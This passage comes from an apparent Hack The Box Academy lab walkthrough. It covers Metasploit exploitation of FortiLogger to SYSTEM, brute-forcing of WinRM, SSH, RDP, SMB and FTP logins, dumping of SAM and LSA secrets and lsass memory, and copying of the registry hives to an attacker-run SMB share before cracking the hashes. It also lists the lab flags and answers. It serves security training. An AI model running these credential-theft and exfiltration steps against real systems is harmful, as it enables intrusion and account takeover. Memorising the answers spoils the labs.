</span><span id="__span-148-31"><a id="__codelineno-148-31" name="__codelineno-148-31"></a>[*] Nmap: 49666/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-32"><a id="__codelineno-148-32" name="__codelineno-148-32"></a>[*] Nmap: 49667/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-33"><a id="__codelineno-148-33" name="__codelineno-148-33"></a>[*] Nmap: 49668/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-34"><a id="__codelineno-148-34" name="__codelineno-148-34"></a>[*] Nmap: 49669/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-35"><a id="__codelineno-148-35" name="__codelineno-148-35"></a>[*] Nmap: 49670/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-36"><a id="__codelineno-148-36" name="__codelineno-148-36"></a>[*] Nmap: 49671/tcp open  msrpc         Microsoft Windows RPC
</span><span id="__span-148-37"><a id="__codelineno-148-37" name="__codelineno-148-37"></a>[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span><span id="__span-148-38"><a id="__codelineno-148-38" name="__codelineno-148-38"></a>[*] Nmap: Host script results:
</span><span id="__span-148-39"><a id="__codelineno-148-39" name="__codelineno-148-39"></a>[*] Nmap: | smb2-time:
</span><span id="__span-148-40"><a id="__codelineno-148-40" name="__codelineno-148-40"></a>[*] Nmap: |   date: 2024-09-23T19:38:06
</span><span id="__span-148-41"><a id="__codelineno-148-41" name="__codelineno-148-41"></a>[*] Nmap: |_  start_date: N/A
</span><span id="__span-148-42"><a id="__codelineno-148-42" name="__codelineno-148-42"></a>[*] Nmap: | smb2-security-mode:
</span><span id="__span-148-43"><a id="__codelineno-148-43" name="__codelineno-148-43"></a>[*] Nmap: |   3:1:1:
</span><span id="__span-148-44"><a id="__codelineno-148-44" name="__codelineno-148-44"></a>[*] Nmap: |_    Message signing enabled but not required
</span><span id="__span-148-45"><a id="__codelineno-148-45" name="__codelineno-148-45"></a>[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></code></pre></div></td></tr></table></div>
<p>After visiting $ip:5000 you can see the Fortilogger service. </p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-149-1">1</a></span>
<span class="normal"><a href="#__codelineno-149-2">2</a></span>
<span class="normal"><a href="#__codelineno-149-3">3</a></span>
<span class="normal"><a href="#__codelineno-149-4">4</a></span>
<span class="normal"><a href="#__codelineno-149-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1"></a>search fortilogger
</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2"></a>use exploit/windows/http/fortilogger_arbitrary_fileupload
</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3"></a># SET LHOST, RHOSTS...
</span><span id="__span-149-4"><a id="__codelineno-149-4" name="__codelineno-149-4"></a>run 
</span><span id="__span-149-5"><a id="__codelineno-149-5" name="__codelineno-149-5"></a>getuid
</span></code></pre></div></td></tr></table></div>
<p>Results: NT AUTHORITY\SYSTEM</p>
<p>Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-150-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1"></a>lsa_dump_sam
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-151-1">1</a></span>
<span class="normal"><a href="#__codelineno-151-2">2</a></span>
<span class="normal"><a href="#__codelineno-151-3">3</a></span>
<span class="normal"><a href="#__codelineno-151-4">4</a></span>
<span class="normal"><a href="#__codelineno-151-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1"></a>... CUT ...
</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2"></a>RID  : 000003ea (1002)
</span><span id="__span-151-3"><a id="__codelineno-151-3" name="__codelineno-151-3"></a>User : htb-student
</span><span id="__span-151-4"><a id="__codelineno-151-4" name="__codelineno-151-4"></a>  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
</span><span id="__span-151-5"><a id="__codelineno-151-5" name="__codelineno-151-5"></a>... CUT ...
</span></code></pre></div></td></tr></table></div>
<p>Results: cf3a5525ee9414229e66279623ed5c58</p>
<h2 id="password-attacks"><a href="https://academy.hackthebox.com/module/details/147">Password Attacks</a></h2>
<h3 id="remote-password-attacks">Remote Password Attacks</h3>
<p><strong>Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.</strong>
 
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-152-1">1</a></span>
<span class="normal"><a href="#__codelineno-152-2">2</a></span>
<span class="normal"><a href="#__codelineno-152-3">3</a></span>
<span class="normal"><a href="#__codelineno-152-4">4</a></span>
<span class="normal"><a href="#__codelineno-152-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1"></a>crackmapexec<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>username.list<span class="w"> </span>-p<span class="w"> </span>password.list<span class="w">    </span>
</span><span id="__span-152-2"><a id="__codelineno-152-2" name="__codelineno-152-2"></a><span class="c1"># Results: WINRM       10.129.173.81   5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)</span>
</span><span id="__span-152-3"><a id="__codelineno-152-3" name="__codelineno-152-3"></a>
</span><span id="__span-152-4"><a id="__codelineno-152-4" name="__codelineno-152-4"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;november&#39;</span><span class="w"> </span>
</span><span id="__span-152-5"><a id="__codelineno-152-5" name="__codelineno-152-5"></a><span class="nb">type</span><span class="w"> </span><span class="s2">&quot;C:\Users\john\Desktop\flag.txt&quot;</span>
</span></code></pre></div></td></tr></table></div></p>
<p>Results: HTB{That5Novemb3r}</p>
<p><strong>Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.</strong>
 
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-153-1">1</a></span>
<span class="normal"><a href="#__codelineno-153-2">2</a></span>
<span class="normal"><a href="#__codelineno-153-3">3</a></span>
<span class="normal"><a href="#__codelineno-153-4">4</a></span>
<span class="normal"><a href="#__codelineno-153-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>username.list<span class="w"> </span>-P<span class="w"> </span>password.list<span class="w"> </span>ssh://<span class="nv">$ip</span>
</span><span id="__span-153-2"><a id="__codelineno-153-2" name="__codelineno-153-2"></a><span class="c1"># Results: [22][ssh] host: 10.129.173.81   login: dennis   password: rockstar</span>
</span><span id="__span-153-3"><a id="__codelineno-153-3" name="__codelineno-153-3"></a>
</span><span id="__span-153-4"><a id="__codelineno-153-4" name="__codelineno-153-4"></a>ssh<span class="w"> </span>dennis@<span class="nv">$ip</span>
</span><span id="__span-153-5"><a id="__codelineno-153-5" name="__codelineno-153-5"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\d</span>ennis<span class="se">\D</span>esktop<span class="se">\f</span>lag.txt
</span></code></pre></div></td></tr></table></div></p>
<p>Results: HTB{Let5R0ck1t}</p>
<p>Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
  
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-154-1">1</a></span>
<span class="normal"><a href="#__codelineno-154-2">2</a></span>
<span class="normal"><a href="#__codelineno-154-3">3</a></span>
<span class="normal"><a href="#__codelineno-154-4">4</a></span>
<span class="normal"><a href="#__codelineno-154-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>~/borrar/username.list<span class="w"> </span>-P<span class="w"> </span>~/borrar/password.list<span class="w"> </span>rdp://<span class="nv">$ip</span><span class="w"> </span>
</span><span id="__span-154-2"><a id="__codelineno-154-2" name="__codelineno-154-2"></a><span class="c1"># Result: [3389][rdp] host: 10.129.173.81   login: chris   password: 789456123</span>
</span><span id="__span-154-3"><a id="__codelineno-154-3" name="__codelineno-154-3"></a>
</span><span id="__span-154-4"><a id="__codelineno-154-4" name="__codelineno-154-4"></a>xfreerdp<span class="w"> </span>/u:chris<span class="w">  </span>/p:789456123<span class="w"> </span>/v:<span class="nv">$ip</span><span class="w"> </span>/cert:ignore<span class="w"> </span>
</span><span id="__span-154-5"><a id="__codelineno-154-5" name="__codelineno-154-5"></a><span class="c1"># open the flag.txt in Desktop.</span>
</span></code></pre></div></td></tr></table></div></p>
<p>Results: HTB{R3m0t3DeskIsw4yT00easy}</p>
<p><strong>Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.</strong>
 
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-155-1">1</a></span>
<span class="normal"><a href="#__codelineno-155-2">2</a></span>
<span class="normal"><a href="#__codelineno-155-3">3</a></span>
<span class="normal"><a href="#__codelineno-155-4">4</a></span>
<span class="normal"><a href="#__codelineno-155-5">5</a></span>
<span class="normal"><a href="#__codelineno-155-6">6</a></span>
<span class="normal"><a href="#__codelineno-155-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>username.list<span class="w"> </span>-p<span class="w"> </span>password.list<span class="w"> </span>--continue-on-success
</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2"></a><span class="c1"># Results: SMB         10.129.173.81   445    WINSRV           [+] WINSRV\cassie:12345678910 </span>
</span><span id="__span-155-3"><a id="__codelineno-155-3" name="__codelineno-155-3"></a>
</span><span id="__span-155-4"><a id="__codelineno-155-4" name="__codelineno-155-4"></a>smbclient<span class="w">  </span><span class="se">\\\\</span><span class="nv">$ip</span><span class="se">\\</span>CASSIE<span class="w"> </span>-U<span class="w"> </span>cassie
</span><span id="__span-155-5"><a id="__codelineno-155-5" name="__codelineno-155-5"></a>get<span class="w"> </span>flag.txt
</span><span id="__span-155-6"><a id="__codelineno-155-6" name="__codelineno-155-6"></a>quit
</span><span id="__span-155-7"><a id="__codelineno-155-7" name="__codelineno-155-7"></a>cat<span class="w"> </span>flag.txt
</span></code></pre></div></td></tr></table></div></p>
<p>Results: HTB{S4ndM4ndB33}  </p>
<p><strong>Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.</strong>
 
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-156-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-156-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-156-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-156-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-156-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-156-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-156-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-156-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-156-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-156-10">10</a></span>
<span class="normal"><a href="#__codelineno-156-11">11</a></span>
<span class="normal"><a href="#__codelineno-156-12">12</a></span>
<span class="normal"><a href="#__codelineno-156-13">13</a></span>
<span class="normal"><a href="#__codelineno-156-14">14</a></span>
<span class="normal"><a href="#__codelineno-156-15">15</a></span>
<span class="normal"><a href="#__codelineno-156-16">16</a></span>
<span class="normal"><a href="#__codelineno-156-17">17</a></span>
<span class="normal"><a href="#__codelineno-156-18">18</a></span>
<span class="normal"><a href="#__codelineno-156-19">19</a></span>
<span class="normal"><a href="#__codelineno-156-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-156-1"><a id="__codelineno-156-1" name="__codelineno-156-1"></a><span class="c1"># Download the zip file and unzip it:</span>
</span><span id="__span-156-2"><a id="__codelineno-156-2" name="__codelineno-156-2"></a>unzip<span class="w"> </span>Password-Attacks.zip
</span><span id="__span-156-3"><a id="__codelineno-156-3" name="__codelineno-156-3"></a>
</span><span id="__span-156-4"><a id="__codelineno-156-4" name="__codelineno-156-4"></a><span class="c1"># Create a mutated list </span>
</span><span id="__span-156-5"><a id="__codelineno-156-5" name="__codelineno-156-5"></a>hashcat<span class="w"> </span>--force<span class="w"> </span>password.list<span class="w"> </span>-r<span class="w"> </span>custom.rule<span class="w"> </span>--stdout<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>mut_password.list
</span><span id="__span-156-6"><a id="__codelineno-156-6" name="__codelineno-156-6"></a>
</span><span id="__span-156-7"><a id="__codelineno-156-7" name="__codelineno-156-7"></a>cat<span class="w"> </span>mut_password.list<span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;^.{11,}$&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>new_mutated.list
</span><span id="__span-156-8"><a id="__codelineno-156-8" name="__codelineno-156-8"></a>
</span><span id="__span-156-9"><a id="__codelineno-156-9" name="__codelineno-156-9"></a>
</span><span id="__span-156-10"><a id="__codelineno-156-10" name="__codelineno-156-10"></a><span class="c1"># Evaluate open services:</span>
</span><span id="__span-156-11"><a id="__codelineno-156-11" name="__codelineno-156-11"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.129.182.237<span class="w"> </span>-Pn
</span><span id="__span-156-12"><a id="__codelineno-156-12" name="__codelineno-156-12"></a><span class="c1"># Results: 21 and 22</span>
</span><span id="__span-156-13"><a id="__codelineno-156-13" name="__codelineno-156-13"></a>
</span><span id="__span-156-14"><a id="__codelineno-156-14" name="__codelineno-156-14"></a><span class="c1"># Let&#39;s bruteforce ftp:</span>
</span><span id="__span-156-15"><a id="__codelineno-156-15" name="__codelineno-156-15"></a>hydra<span class="w"> </span>-l<span class="w"> </span>sam<span class="w"> </span>-P<span class="w"> </span>new_mutated.list<span class="w"> </span>-t<span class="w"> </span><span class="m">64</span><span class="w"> </span>ftp://10.129.182.237
</span><span id="__span-156-16"><a id="__codelineno-156-16" name="__codelineno-156-16"></a><span class="c1"># Result: [21][ftp] host: 10.129.182.237   login: sam   password: B@tm@n2022!</span>
</span><span id="__span-156-17"><a id="__codelineno-156-17" name="__codelineno-156-17"></a>
</span><span id="__span-156-18"><a id="__codelineno-156-18" name="__codelineno-156-18"></a>ssh<span class="w"> </span>sam<span class="nv">$ip</span>
</span><span id="__span-156-19"><a id="__codelineno-156-19" name="__codelineno-156-19"></a>
</span><span id="__span-156-20"><a id="__codelineno-156-20" name="__codelineno-156-20"></a>cat<span class="w"> </span>smb/flag.txt
</span></code></pre></div></td></tr></table></div></p>
<p>Results: HTB{P455_Mu7ations}</p>
<p><strong>Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: <code>&lt;username&gt;:&lt;password&gt;)</code>:</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-157-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-157-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-157-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-157-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-157-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-157-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-157-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-157-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-157-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-157-10">10</a></span>
<span class="normal"><a href="#__codelineno-157-11">11</a></span>
<span class="normal"><a href="#__codelineno-157-12">12</a></span>
<span class="normal"><a href="#__codelineno-157-13">13</a></span>
<span class="normal"><a href="#__codelineno-157-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-157-1"><a id="__codelineno-157-1" name="__codelineno-157-1"></a><span class="c1"># Install creds</span>
</span><span id="__span-157-2"><a id="__codelineno-157-2" name="__codelineno-157-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/ihebski/DefaultCreds-cheat-sheet.git<span class="w"> </span>
</span><span id="__span-157-3"><a id="__codelineno-157-3" name="__codelineno-157-3"></a><span class="nb">cd</span><span class="w"> </span>DefaultCreds-cheat-sheet<span class="w"> </span>
</span><span id="__span-157-4"><a id="__codelineno-157-4" name="__codelineno-157-4"></a>pip3<span class="w"> </span>install<span class="w"> </span>defaultcreds-cheat-sheet<span class="w">        </span>
</span><span id="__span-157-5"><a id="__codelineno-157-5" name="__codelineno-157-5"></a>
</span><span id="__span-157-6"><a id="__codelineno-157-6" name="__codelineno-157-6"></a><span class="c1"># search for default password</span>
</span><span id="__span-157-7"><a id="__codelineno-157-7" name="__codelineno-157-7"></a>creds<span class="w"> </span>search<span class="w"> </span>mysql<span class="w">  </span>
</span><span id="__span-157-8"><a id="__codelineno-157-8" name="__codelineno-157-8"></a>
</span><span id="__span-157-9"><a id="__codelineno-157-9" name="__codelineno-157-9"></a><span class="c1"># Ssh to the host and try the default passwords</span>
</span><span id="__span-157-10"><a id="__codelineno-157-10" name="__codelineno-157-10"></a>ssh<span class="w"> </span>sam@<span class="nv">$ip</span>
</span><span id="__span-157-11"><a id="__codelineno-157-11" name="__codelineno-157-11"></a><span class="c1"># Enter password: B@tm@n2022!</span>
</span><span id="__span-157-12"><a id="__codelineno-157-12" name="__codelineno-157-12"></a>
</span><span id="__span-157-13"><a id="__codelineno-157-13" name="__codelineno-157-13"></a><span class="c1"># Enter Mysql with one of the default password</span>
</span><span id="__span-157-14"><a id="__codelineno-157-14" name="__codelineno-157-14"></a>mysql<span class="w"> </span>-u<span class="w"> </span>superdba<span class="w"> </span>-padmin
</span></code></pre></div></td></tr></table></div>
<p>Results: superdba:admin</p>
<h3 id="windows-local-password-attacks">Windows Local Password Attacks</h3>
<p><strong>Where is the SAM database located in the Windows registry? (Format: </strong>*)**
Results: hklm\sam</p>
<p>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
 
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-158-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-158-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-158-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-158-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-158-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-158-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-158-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-158-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-158-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-158-10">10</a></span>
<span class="normal"><a href="#__codelineno-158-11">11</a></span>
<span class="normal"><a href="#__codelineno-158-12">12</a></span>
<span class="normal"><a href="#__codelineno-158-13">13</a></span>
<span class="normal"><a href="#__codelineno-158-14">14</a></span>
<span class="normal"><a href="#__codelineno-158-15">15</a></span>
<span class="normal"><a href="#__codelineno-158-16">16</a></span>
<span class="normal"><a href="#__codelineno-158-17">17</a></span>
<span class="normal"><a href="#__codelineno-158-18">18</a></span>
<span class="normal"><a href="#__codelineno-158-19">19</a></span>
<span class="normal"><a href="#__codelineno-158-20">20</a></span>
<span class="normal"><a href="#__codelineno-158-21">21</a></span>
<span class="normal"><a href="#__codelineno-158-22">22</a></span>
<span class="normal"><a href="#__codelineno-158-23">23</a></span>
<span class="normal"><a href="#__codelineno-158-24">24</a></span>
<span class="normal"><a href="#__codelineno-158-25">25</a></span>
<span class="normal"><a href="#__codelineno-158-26">26</a></span>
<span class="normal"><a href="#__codelineno-158-27">27</a></span>
<span class="normal"><a href="#__codelineno-158-28">28</a></span>
<span class="normal"><a href="#__codelineno-158-29">29</a></span>
<span class="normal"><a href="#__codelineno-158-30">30</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-158-1"><a id="__codelineno-158-1" name="__codelineno-158-1"></a># Connect to the machine
</span><span id="__span-158-2"><a id="__codelineno-158-2" name="__codelineno-158-2"></a>
</span><span id="__span-158-3"><a id="__codelineno-158-3" name="__codelineno-158-3"></a># Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.
</span><span id="__span-158-4"><a id="__codelineno-158-4" name="__codelineno-158-4"></a>reg.exe save hklm\sam C:\sam.save
</span><span id="__span-158-5"><a id="__codelineno-158-5" name="__codelineno-158-5"></a>reg.exe save hklm\system C:\system.save
</span><span id="__span-158-6"><a id="__codelineno-158-6" name="__codelineno-158-6"></a>reg.exe save hklm\security C:\security.save
</span><span id="__span-158-7"><a id="__codelineno-158-7" name="__codelineno-158-7"></a>
</span><span id="__span-158-8"><a id="__codelineno-158-8" name="__codelineno-158-8"></a># From your kali attacking machine, mount a smb share
</span><span id="__span-158-9"><a id="__codelineno-158-9" name="__codelineno-158-9"></a>python3 ./impacket/examples/smbserver.py -smb2support CompData /home/lala/borrar
</span><span id="__span-158-10"><a id="__codelineno-158-10" name="__codelineno-158-10"></a>
</span><span id="__span-158-11"><a id="__codelineno-158-11" name="__codelineno-158-11"></a># From the victim&#39;s machine (windows), moves the registries to your attacking machine
</span><span id="__span-158-12"><a id="__codelineno-158-12" name="__codelineno-158-12"></a>move sam.save \\$ipAttacker\CompData
</span><span id="__span-158-13"><a id="__codelineno-158-13" name="__codelineno-158-13"></a>move system.save \\$ipAttacker\CompData
</span><span id="__span-158-14"><a id="__codelineno-158-14" name="__codelineno-158-14"></a>move security.save \\$ipAttacker\CompData
</span><span id="__span-158-15"><a id="__codelineno-158-15" name="__codelineno-158-15"></a>
</span><span id="__span-158-16"><a id="__codelineno-158-16" name="__codelineno-158-16"></a># Dumping Hashes with Impacket&#39;s secretsdump.py
</span><span id="__span-158-17"><a id="__codelineno-158-17" name="__codelineno-158-17"></a>python3 ./impacket/examples/secretsdump.py -sam ~/borrar/sam.save -security ~/borrar/security.save -system ~/borrar/system.save LOCAL
</span><span id="__span-158-18"><a id="__codelineno-158-18" name="__codelineno-158-18"></a>
</span><span id="__span-158-19"><a id="__codelineno-158-19" name="__codelineno-158-19"></a># Results:
</span><span id="__span-158-20"><a id="__codelineno-158-20" name="__codelineno-158-20"></a># Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-158-21"><a id="__codelineno-158-21" name="__codelineno-158-21"></a># Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-158-22"><a id="__codelineno-158-22" name="__codelineno-158-22"></a># DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-158-23"><a id="__codelineno-158-23" name="__codelineno-158-23"></a># WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
</span><span id="__span-158-24"><a id="__codelineno-158-24" name="__codelineno-158-24"></a># bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
</span><span id="__span-158-25"><a id="__codelineno-158-25" name="__codelineno-158-25"></a># jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
</span><span id="__span-158-26"><a id="__codelineno-158-26" name="__codelineno-158-26"></a># ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
</span><span id="__span-158-27"><a id="__codelineno-158-27" name="__codelineno-158-27"></a># frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
</span><span id="__span-158-28"><a id="__codelineno-158-28" name="__codelineno-158-28"></a>
</span><span id="__span-158-29"><a id="__codelineno-158-29" name="__codelineno-158-29"></a># Running hascat
</span><span id="__span-158-30"><a id="__codelineno-158-30" name="__codelineno-158-30"></a>sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt 
</span></code></pre></div></td></tr></table></div></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-159-1">1</a></span>
<span class="normal"><a href="#__codelineno-159-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-159-1"><a id="__codelineno-159-1" name="__codelineno-159-1"></a># Another way to do it is running crackmapexec from the attacking machine:
</span><span id="__span-159-2"><a id="__codelineno-159-2" name="__codelineno-159-2"></a>crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --sam  
</span></code></pre></div></td></tr></table></div>
<p>Results:  matrix</p>
<p><strong>RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-160-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-160-1"><a id="__codelineno-160-1" name="__codelineno-160-1"></a>crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
</span></code></pre></div></td></tr></table></div>
<p>Results: frontdesk:Password123</p>
<p><strong>What is the name of the executable file associated with the Local Security Authority Process?</strong></p>
<p>Results:  lsass.exe</p>
<p><strong>RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-161-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-161-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-161-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-161-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-161-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-161-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-161-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-161-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-161-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-161-10">10</a></span>
<span class="normal"><a href="#__codelineno-161-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-161-1"><a id="__codelineno-161-1" name="__codelineno-161-1"></a># `Open Task Manager` &gt; `Select the Processes tab` &gt; `Find &amp; right click the Local Security Authority Process` &gt; `Select Create dump file`. It&#39;s created under:
</span><span id="__span-161-2"><a id="__codelineno-161-2" name="__codelineno-161-2"></a> C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP
</span><span id="__span-161-3"><a id="__codelineno-161-3" name="__codelineno-161-3"></a>
</span><span id="__span-161-4"><a id="__codelineno-161-4" name="__codelineno-161-4"></a># From our kali we mount a shared unit
</span><span id="__span-161-5"><a id="__codelineno-161-5" name="__codelineno-161-5"></a>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar   
</span><span id="__span-161-6"><a id="__codelineno-161-6" name="__codelineno-161-6"></a>
</span><span id="__span-161-7"><a id="__codelineno-161-7" name="__codelineno-161-7"></a># From the RDP connection open a powershell with Admin rights:
</span><span id="__span-161-8"><a id="__codelineno-161-8" name="__codelineno-161-8"></a>move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP  \\$ipKali$\CompData
</span><span id="__span-161-9"><a id="__codelineno-161-9" name="__codelineno-161-9"></a>
</span><span id="__span-161-10"><a id="__codelineno-161-10" name="__codelineno-161-10"></a># Crack the lsass file withPypykatz
</span><span id="__span-161-11"><a id="__codelineno-161-11" name="__codelineno-161-11"></a>pypykatz lsa minidump ~/borrar/lsass.DMP 
</span></code></pre></div></td></tr></table></div>
<p>We obtain the following:</p>
